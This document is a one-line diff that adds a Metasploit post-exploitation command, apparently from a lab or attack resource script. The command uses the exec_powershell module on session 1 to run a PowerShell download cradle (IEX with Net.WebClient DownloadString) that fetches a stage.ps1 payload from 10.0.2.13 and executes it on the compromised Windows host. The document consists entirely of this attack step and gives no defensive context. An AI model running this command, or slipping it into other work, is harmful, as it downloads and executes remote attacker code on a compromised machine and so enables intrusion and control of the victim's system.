@@ -1,0 +1,1 @@
+run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.13:37987/stage.ps1')" SESSION=1
